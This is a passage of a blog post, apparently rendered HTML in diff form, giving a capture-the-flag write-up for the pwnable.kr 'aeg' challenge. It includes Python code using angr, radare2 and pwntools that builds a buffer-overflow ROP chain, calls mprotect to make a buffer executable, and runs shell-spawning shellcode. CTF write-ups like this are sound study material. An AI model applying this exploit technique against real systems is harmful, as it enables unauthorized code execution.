+<span class="code-line">    <span class="n">args</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">chain_addr</span> <span class="o">=</span> <span class="n">chain_func</span><span class="o">.</span><span class="n">get_call_target</span><span class="p">(</span><span class="n">chain_next</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">last_state</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">call_state</span><span class="p">(</span><span class="n">chain_addr</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">sm</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">last_state</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">sm</span><span class="o">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="n">chain_addr</span><span class="o">+</span><span class="mh">0x20</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">pad_size</span> <span class="o">=</span> <span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">rbp</span><span class="o">-</span><span class="n">sm</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">rdi</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="k">return</span> <span class="p">(</span><span class="n">pad_size</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">args</span><span class="p">))</span></span>
+</pre></div>
+
+
+<p>The function returns a tupple of the padding size needed at the exploitable
+function and the prefix needed to reach the function. Cool, huh?.</p>
+<h3>Reading the XOR values</h3>
+<p>I should've been able to extract the XOR values using angr too.  Sadly, I
+didn't know how to use angr properly when I worked on this problem so I need to
+extract the XOR values directly from the disassembly. For that, I use r2pipe,
+which is a python binding to interact with radare2 directly. Neat!</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="k">def</span> <span class="nf">get_two_xor</span><span class="p">(</span><span class="n">bin_name</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">r2</span> <span class="o">=</span> <span class="n">r2pipe</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">bin_name</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">main_disas</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;pdf @ main&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s1">&#39;xor eax, (.*)&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">return</span> <span class="nb">tuple</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">re</span><span class="o">.</span><span class="n">finditer</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">main_disas</span><span class="p">)])</span></span>
+</pre></div>
+
+
+<h3>ROP crafting</h3>
+<p>Now, it's the headache part. The binary is dynamically linked so we can't
+create ROP chain out of thin air with ROPgadget. At first, I tried to leak the
+address of some functions using puts and then we can point to <code>system</code>.
+Unfortunately, it also run on top some other process, which will print stdout
+ONLY if it execute cleanly. To make it worse, there's no relocation for
+<code>exit()</code> so we can't call it.</p>
+<p>At this point, I'm already frustrated to the point I want to search for
+solutions online, when I look at the list functions and there's one that I'm
+don't know what it does. The function is called <code>mprotect()</code>. After looking
+quickly through the manual page, it seems that <code>mprotect()</code> can change the
+protection on some mapped memory region. Great, so we can use this to set our
+buffer as executable and jump to it to get a shell.  Let's try to use
+<code>mprotect()</code>.</p>
+<p>We will construct ROP payload which will load some arguments for mprotect
+(using the mentioned gadget), then jump to mprotect to change the protection,
+and then jump to our shellcode. Because we don't know the stack address, we
+can't change the protection for it. Instead, we'll use our input buffer right
+after it was encoded. The input buffer is static in BSS section, so we know the
+address. We can only change the input buffer, so we'll put the shellcode inside
+the input buffer. Also, because we need to know the <code>rbp</code> so the gadget can
+load our arguments, we also need to use the input buffer to put the arguments
+to <code>mprotect()</code>. The rop payload will be in the input buffer because the load
+parameter gadget changes the <code>rsp</code> to our fake <code>rbp</code>.</p>
+<p>So, the ropchain payload in the buffer overflow will be <code>&lt;fake rbp&gt;&lt;jump to
+load parameter&gt;</code>, which will allow the program to load arguments to registers.
+After that, the ropchain payload is coming from the input buffer.  The layout
+of the ropchain payload in the input buffer will be
+<code>input|pad|shellcode|pad|arguments</code>. Some weird things happened if we use said
+layout.</p>
+<p>Apparently, <code>mprotect()</code> use <code>xsave [rsp+0x40]</code> instruction that messes up our
+payload. I don't really know what it does, but a quick look at <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf">Intel
+reference</a>
+manual tell us that it:</p>
+<blockquote>
+<p>Performs a full or partial save of processor state
+components to the XSAVE area located at the memory address specified by the
+destination operand.</p>
+</blockquote>
+<p>It's weird because it shouldn't mess with our payload. The <code>rsp</code> register will
+point to some weird memory location outside out buffer, but when we step right
+into the instruction, our payload become scattered. The instruction seems to
+work at page-level, but we can't separate the shellcode page and buffer page
+because our input is limited to 1000 bytes (usual page is 4K in size).</p>
+<p>I'm frustrated again at this point and I just shuffle around the payload and I
+came up with the <code>input|pad|arguments|pad|shellcode</code> layout.</p>
+<p>AND. IT. SUDDENLY. WORKS.</p>
+<p>I don't know what really happened here, but it works. Running the script
+pointed to the game endpoint gives us a shell that we can use to get the flag.
+Here's the final ROP script:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><span class="k">def</span> <span class="nf">craft_rop</span><span class="p">(</span><span class="n">bin_name</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">r2</span> <span class="o">=</span> <span class="n">r2pipe</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">bin_name</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;e asm.varsub = false&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">main_disas</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;pdf@main&#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">helper_func</span> <span class="o">=</span> <span class="n">disas_regex</span><span class="p">(</span><span class="s1">&#39;call (fcn\..*)&#39;</span><span class="p">,</span> <span class="n">main_disas</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">helper_disas</span> <span class="o">=</span> <span class="n">r2</span><span class="o">.</span><span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;pdf@{}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">helper_func</span><span class="p">))</span></span>
+<span class="code-line">    <span class="n">param_loader</span> <span class="o">=</span> <span class="n">disas_regex_addr</span><span class="p">(</span><span class="s1">&#39;.*(0x[0-9a-f]+).*mov .*, qword .*&#39;</span><span class="p">,</span> <span class="n">helper_disas</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">buffer_address</span> <span class="o">=</span> <span class="n">disas_regex_addr</span><span class="p">(</span><span class="s1">&#39;lea rdx, \[rax \+ (0x[0-9a-f]+)\]&#39;</span><span class="p">,</span> <span class="n">main_disas</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">overflow_size</span><span class="p">,</span> <span class="n">prefix_to_vuln</span> <span class="o">=</span> <span class="n">solve_with_angr</span><span class="p">(</span><span class="n">bin_name</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="c1"># payload layout</span></span>
+<span class="code-line">    <span class="n">rbp_off</span> <span class="o">=</span> <span class="mh">0x100</span></span>
+<span class="code-line">    <span class="n">rbp_addr</span> <span class="o">=</span> <span class="n">buffer_address</span> <span class="o">+</span> <span class="n">rbp_off</span></span>
+<span class="code-line">    <span class="n">sc_off</span> <span class="o">=</span> <span class="mh">0x200</span></span>
+<span class="code-line">    <span class="n">sc_addr</span> <span class="o">=</span> <span class="n">buffer_address</span> <span class="o">+</span> <span class="n">sc_off</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span></span>
+<span class="code-line">    <span class="c1"># setup parameter address</span></span>
+<span class="code-line">    <span class="c1"># puzzle args, point rbp to rbp_addr which serve to store mprotect argument</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">+=</span> <span class="n">prefix_to_vuln</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">+=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">overflow_size</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">buffer_address</span><span class="o">+</span><span class="n">rbp_off</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">param_loader</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="c1"># at rbp layout</span></span>
+<span class="code-line">    <span class="c1"># r8, rdi, rcx, rdx, rsi, rax</span></span>
+<span class="code-line">    <span class="c1"># r9 (= r8), r8 (= rdi), rdi (= rax)</span></span>
+<span class="code-line">    <span class="c1"># pad to rbp offset</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">+=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">rbp_off</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span></span>
+<span class="code-line">    <span class="n">rdi_off</span> <span class="o">=</span> <span class="n">rbp_off</span> <span class="o">-</span> <span class="n">disas_regex_addr</span><span class="p">(</span><span class="s1">&#39;mov rax, qword \[rbp - (0x[0-9a-f]+)\]&#39;</span><span class="p">,</span> <span class="n">helper_disas</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">rsi_off</span> <span class="o">=</span> <span class="n">rbp_off</span> <span class="o">-</span> <span class="n">disas_regex_addr</span><span class="p">(</span><span class="s1">&#39;mov rsi, qword \[rbp - (0x[0-9a-f]+)\]&#39;</span><span class="p">,</span> <span class="n">helper_disas</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">rdx_off</span> <span class="o">=</span> <span class="n">rbp_off</span> <span class="o">-</span> <span class="n">disas_regex_addr</span><span class="p">(</span><span class="s1">&#39;mov rdx, qword \[rbp - (0x[0-9a-f]+)\]&#39;</span><span class="p">,</span> <span class="n">helper_disas</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">rdi_arg</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span> <span class="p">(</span><span class="n">buffer_address</span> <span class="o">+</span> <span class="n">sc_off</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span> <span class="p">)</span></span>
+<span class="code-line">    <span class="n">rsi_arg</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">rdx_arg</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">=</span> <span class="n">rop</span><span class="p">[:</span><span class="n">rdi_off</span><span class="p">]</span> <span class="o">+</span> <span class="n">rdi_arg</span> <span class="o">+</span> <span class="n">rop</span><span class="p">[</span><span class="n">rdi_off</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">rdi_arg</span><span class="p">):]</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">=</span> <span class="n">rop</span><span class="p">[:</span><span class="n">rsi_off</span><span class="p">]</span> <span class="o">+</span> <span class="n">rsi_arg</span> <span class="o">+</span> <span class="n">rop</span><span class="p">[</span><span class="n">rsi_off</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">rsi_arg</span><span class="p">):]</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">=</span> <span class="n">rop</span><span class="p">[:</span><span class="n">rdx_off</span><span class="p">]</span> <span class="o">+</span> <span class="n">rdx_arg</span> <span class="o">+</span> <span class="n">rop</span><span class="p">[</span><span class="n">rdx_off</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">rdx_arg</span><span class="p">):]</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="c1"># construct ropchain to mprotect then to shellcode</span></span>
+<span class="code-line">    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bin_name</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">r</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rbp_addr</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">r</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;mprotect&#39;</span><span class="p">])</span></span>
+<span class="code-line">    <span class="n">r</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sc_addr</span><span class="p">)</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">chain</span><span class="p">()</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="c1"># at sc layout</span></span>
+<span class="code-line">    <span class="c1"># pad to sc offset, then add shellcode</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">+=</span> <span class="n">cyclic</span><span class="p">(</span><span class="n">sc_off</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="p">))</span></span>
+<span class="code-line">    <span class="n">rop</span> <span class="o">+=</span> <span class="n">sc</span></span>
+<span class="code-line"></span>
+<span class="code-line">    <span class="k">return</span> <span class="n">rop</span></span>
+</pre></div>
+
+
+<p>I guess I'll study what <code>xsave mem</code> next. But hey, at least I get the flag ;).</p>
+<p><em>Note: I can't give the full solver script as it's against pwnable.kr rule</em></p>
+<footer>
+	<div class="post-share-links">
+		<a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//aufarg.github.io/pwnablekr-aeg-550.html" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i></a>
+		<a href="https://twitter.com/intent/tweet?text=pwnable.kr%3A%20aeg%20%28550%29&url=https%3A//aufarg.github.io/pwnablekr-aeg-550.html" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i></a>
+		<a href="https://plus.google.com/share?url=https%3A//aufarg.github.io/pwnablekr-aeg-550.html" target="_blank" title="Share on Google Plus"><i class="fa fa-google-plus-square" aria-hidden="true"></i></a>
+		<a href="mailto:?subject=pwnable.kr%3A%20aeg%20%28550%29&amp;body=https%3A//aufarg.github.io/pwnablekr-aeg-550.html" target="_blank" title="Share via Email"><i class="fa fa-envelope-square" aria-hidden="true"></i></a>
+	</div>
+</footer>
+<div class="post-related">
+	<h3>Related Posts</h3>
+	<div class="post-summary">
+		<a href="https://aufarg.github.io/pwnablekr-rootkit-400.html">pwnable.kr: rootkit (400)</a>
+	</div>
+</div>	</article>
+</section>
+		<hr/>
+	</div>
+	<footer id="siteinfo" class="footer">
+		<div>
+			<a href="https://aufarg.github.io">Aufar Gilbran</a> (2012)
+		</div>
+		<div>
+			powered by <a href="http://getpelican.com/">Pelican</a>
+			and <a href="http://python.org">Python</a>. 
+			Theme based on <a href="http://github.com/slok/iris">iris</a>
+		</div>
+		<div>
+			Icons from Font Awesome by <a href="http://fontawesome.io/"> font awesome</a>.
+			<a href="https://fonts.google.com/specimen/Open+Sans+Condensed">Title & headers</a>, <a href="https://fonts.google.com/specimen/Lato">body</a> and <a href="https://fonts.google.com/specimen/Inconsolata">source code</a> fonts by google fonts
+		</div>
+		<div class="social">
+			<a href="https://github.com/aufarg"><i class="fa fa-github-square"></i></a>
+			<a href="#"><i class="fa fa-Another social link-square"></i></a>
+			<a href="mailto:aufargilbran@gmail.com"><i class="fa fa-envelope-square"></i></a>
+		</div>
+	</footer>
+
+</body>
+</html>
